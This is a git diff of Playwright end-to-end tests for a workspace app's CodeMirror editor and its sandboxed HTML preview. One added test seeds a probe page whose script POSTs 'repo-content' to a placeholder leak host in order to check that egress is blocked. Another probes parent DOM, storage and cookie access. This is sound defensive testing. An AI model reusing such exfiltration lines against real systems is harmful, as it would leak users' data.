@@ -13,6 +13,13 @@ const BLUE_PIXEL = Buffer.from(
   "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=",
   "base64",
 );
+const BLOCKED_PREVIEW_URL = "https://html-preview.invalid/leak";
+
+interface LinkedFile {
+  target: string;
+  fileName: string;
+  content: string;
+}
 
 function editor(page: Page) {
   return page.getByTestId("file-source-editor").filter({ visible: true }).locator(".cm-content");
@@ -40,7 +47,31 @@ async function openWorkspaceFile(page: Page, filename: string): Promise<void> {
   await expectFileTabOpen(page, filename);
 }
 
-async function seedAgentWithFileLink(target: string) {
+function htmlPreview(page: Page) {
+  return {
+    host: page.getByTestId("file-html-preview"),
+    document: page.frameLocator('[data-testid="file-html-preview"]'),
+  };
+}
+
+async function selectFileView(page: Page, view: "Preview" | "Source"): Promise<void> {
+  const option = page.getByTestId("file-panel-bar").getByRole("button", {
+    name: view,
+    exact: true,
+  });
+  await option.click();
+  await expect(option).toHaveAttribute("aria-selected", "true");
+}
+
+function watchRequestsTo(page: Page, origin: string): string[] {
+  const requests: string[] = [];
+  page.on("request", (request) => {
+    if (request.url().startsWith(origin)) requests.push(request.url());
+  });
+  return requests;
+}
+
+async function seedAgentWithFileLink(input: LinkedFile) {
   const session = await seedMockAgentWorkspace({
     repoPrefix: "file-editing-chat-link-",
     title: "Chat file link e2e",
@@ -49,24 +80,25 @@ async function seedAgentWithFileLink(target: string) {
       "Return JSON only with fields 'title' and 'branch'.",
       "",
       "<user-prompt>",
-      `Open \`${target}\` now`,
+      `Open \`${input.target}\` now`,
       "</user-prompt>",
     ].join("\n"),
   });
-  await writeFile(
-    path.join(session.cwd, "target.ts"),
-    Array.from({ length: 80 }, (_, index) => `export const line${index + 1} = ${index + 1};`).join(
-      "\n",
-    ),
-    "utf8",
-  );
+  await writeFile(path.join(session.cwd, input.fileName), input.content, "utf8");
   return session;
 }
 
 test.describe("CodeMirror workspace file editing", () => {
   test("opens an assistant file link at its referenced line", async ({ page }) => {
     const target = "target.ts:42";
-    const session = await seedAgentWithFileLink(target);
+    const session = await seedAgentWithFileLink({
+      target,
+      fileName: "target.ts",
+      content: Array.from(
+        { length: 80 },
+        (_, index) => `export const line${index + 1} = ${index + 1};`,
+      ).join("\n"),
+    });
 
     try {
       await openAgentRoute(page, session);
@@ -105,7 +137,14 @@ test.describe("CodeMirror workspace file editing", () => {
 
   test("clicking the editor focuses its pane beside an agent", async ({ page }) => {
     const target = "target.ts:42";
-    const session = await seedAgentWithFileLink(target);
+    const session = await seedAgentWithFileLink({
+      target,
+      fileName: "target.ts",
+      content: Array.from(
+        { length: 80 },
+        (_, index) => `export const line${index + 1} = ${index + 1};`,
+      ).join("\n"),
+    });
 
     try {
       await page.setViewportSize({ width: 1280, height: 900 });
@@ -126,6 +165,31 @@ test.describe("CodeMirror workspace file editing", () => {
       await expect(
         page.getByTestId(`workspace-tab-agent_${session.agentId}`).filter({ visible: true }),
       ).toBeVisible();
+    } finally {
+      await session.cleanup();
+    }
+  });
+
+  test("opens an HTML line target as source", async ({ page }) => {
+    const target = "plan.html:2";
+    const session = await seedAgentWithFileLink({
+      target,
+      fileName: "plan.html",
+      content: [
+        "<!doctype html>",
+        "<h1>Review this source line</h1>",
+        '<script>document.body.textContent = "This HTML executed";</script>',
+      ].join("\n"),
+    });
+
+    try {
+      await openAgentRoute(page, session);
+      await page.getByText(target, { exact: true }).click();
+
+      await expectFileTabOpen(page, "plan.html");
+      await expect(page.getByTestId("file-source-editor")).toBeVisible();
+      await expect(page.getByLabel("Line 2, column 1")).toBeVisible();
+      await expect(page.getByTestId("file-html-preview")).toHaveCount(0);
     } finally {
       await session.cleanup();
     }
@@ -160,9 +224,9 @@ test.describe("CodeMirror workspace file editing", () => {
       relativePath,
     );
     await expect(page.getByTestId("file-panel-bar")).not.toContainText("visuals.md");
-    const modeControl = page.getByTestId("file-markdown-mode");
+    const modeControl = page.getByTestId("file-preview-mode");
     await expect(modeControl).toBeVisible();
-    await page.getByTestId("file-mode-source").click();
+    await selectFileView(page, "Source");
 
     const editorHost = page.getByTestId("file-source-editor");
     const content = editor(page);
@@ -224,7 +288,7 @@ test.describe("CodeMirror workspace file editing", () => {
     );
     await workspace.navigateTo();
     await openWorkspaceFile(page, "notes.md");
-    await page.getByTestId("file-mode-source").click();
+    await selectFileView(page, "Source");
 
     const markdownScroller = page
       .getByTestId("file-source-editor")
@@ -374,15 +438,15 @@ test.describe("CodeMirror workspace file editing", () => {
     await openWorkspaceFile(page, "notes.md");
 
     await expect(page.getByText("First heading", { exact: true })).toBeVisible();
-    await expect(page.getByTestId("file-markdown-mode")).toBeVisible();
+    await expect(page.getByRole("button", { name: "Preview", exact: true })).toBeVisible();
     await writeFile(markdownPath, "# Updated heading\n", "utf8");
     await expect(page.getByText("Updated heading", { exact: true })).toBeVisible();
 
-    await page.getByTestId("file-mode-source").click();
+    await selectFileView(page, "Source");
     await expect(page.getByTestId("file-source-editor")).toBeVisible();
     await replaceEditorText(page, "# Saved from source\n");
     await expect.poll(() => readFile(markdownPath, "utf8")).toBe("# Saved from source\n");
-    await page.getByTestId("file-mode-preview").click();
+    await selectFileView(page, "Preview");
     await expect(page.getByText("Saved from source", { exact: true })).toBeVisible();
 
     await openWorkspaceFile(page, "pixel.png");
@@ -391,6 +455,110 @@ test.describe("CodeMirror workspace file editing", () => {
     const initialSource = await image.getAttribute("src");
     await writeFile(imagePath, BLUE_PIXEL);
     await expect.poll(() => image.getAttribute("src")).not.toBe(initialSource);
+  });
+
+  test("previews and refreshes an HTML plan while preserving source access", async ({
+    page,
+    withWorkspace,
+  }) => {
+    test.setTimeout(90_000);
+    const workspace = await withWorkspace({ prefix: "file-editing-html-preview-" });
+    const htmlPath = path.join(workspace.repoPath, "plan.html");
+    await writeFile(
+      htmlPath,
+      "<!doctype html><html><body><h1>Visual plan</h1></body></html>",
+      "utf8",
+    );
+    await workspace.navigateTo();
+    await openWorkspaceFile(page, "plan.html");
+
+    const preview = htmlPreview(page);
+    await expect(preview.host).toBeVisible();
+    await expect(preview.host).toHaveAttribute("sandbox", /allow-scripts/);
+    await expect(preview.host).not.toHaveAttribute("sandbox", /allow-same-origin/);
+    await expect(preview.document.getByRole("heading", { name: "Visual plan" })).toBeVisible();
+
+    await writeFile(
+      htmlPath,
+      "<!doctype html><html><body><h1>Updated plan</h1></body></html>",
+      "utf8",
+    );
+    await expect(preview.document.getByRole("heading", { name: "Updated plan" })).toBeVisible();
+
+    await selectFileView(page, "Source");
+    await expect(page.getByTestId("file-source-editor")).toBeVisible();
+    await expect(preview.host).toHaveCount(0);
+    await selectFileView(page, "Preview");
+    await expect(preview.host).toBeVisible();
+  });
+
+  test("runs inline scripts without allowing fetch egress", async ({ page, withWorkspace }) => {
+    test.setTimeout(90_000);
+    const workspace = await withWorkspace({ prefix: "file-editing-html-csp-" });
+    await writeFile(
+      path.join(workspace.repoPath, "probe.html"),
+      `<!doctype html><html><head><title>probe</title></head><body>
+<h1 id="script-result">Inline script did not run</h1>
+<p id="network-result">Network request not attempted</p>
+<p id="document-mode">Standards mode not detected</p>
+<script>
+  document.getElementById("script-result").textContent = "Inline script ran";
+  if (document.compatMode === "CSS1Compat") {
+    document.getElementById("document-mode").textContent = "Standards mode enabled";
+  }
+  var networkResult = document.getElementById("network-result");
+  fetch("${BLOCKED_PREVIEW_URL}", { method: "POST", body: "repo-content" })
+    .then(function () { networkResult.textContent = "Network request allowed"; })
+    .catch(function () { networkResult.textContent = "Network request blocked"; });
+</script>
+</body></html>`,
+      "utf8",
+    );
+    await workspace.navigateTo();
+
+    const blockedRequests = watchRequestsTo(page, BLOCKED_PREVIEW_URL);
+
+    await openWorkspaceFile(page, "probe.html");
+
+    const preview = htmlPreview(page);
+    await expect(
+      preview.document.getByRole("heading", { name: "Inline script ran" }),
+    ).toBeVisible();
+    await expect(
+      preview.document.getByText("Standards mode enabled", { exact: true }),
+    ).toBeVisible();
+    await expect(
+      preview.document.getByText("Network request blocked", { exact: true }),
+    ).toBeVisible();
+    expect(blockedRequests).toEqual([]);
+  });
+
+  test("isolates HTML plans from the app origin and storage", async ({ page, withWorkspace }) => {
+    test.setTimeout(90_000);
+    const workspace = await withWorkspace({ prefix: "file-editing-html-origin-" });
+    await writeFile(
+      path.join(workspace.repoPath, "origin.html"),
+      `<!doctype html><html><body>
+<p id="parent">?</p><p id="storage">?</p><p id="cookie">?</p>
+<script>
+  function report(id, label, probe) {
+    try { probe(); document.getElementById(id).textContent = label + " reachable"; }
+    catch (error) { document.getElementById(id).textContent = label + " blocked"; }
+  }
+  report("parent", "Parent DOM", function () { return parent.document.body; });
+  report("storage", "Storage", function () { return localStorage.length; });
+  report("cookie", "Cookies", function () { return document.cookie; });
+</script>
+</body></html>`,
+      "utf8",
+    );
+    await workspace.navigateTo();
+    await openWorkspaceFile(page, "origin.html");
+
+    const preview = htmlPreview(page);
+    await expect(preview.document.getByText("Parent DOM blocked", { exact: true })).toBeVisible();
+    await expect(preview.document.getByText("Storage blocked", { exact: true })).toBeVisible();
+    await expect(preview.document.getByText("Cookies blocked", { exact: true })).toBeVisible();
   });
 
   test("persists Vim keybindings and reports Vim mode with cursor position", async ({
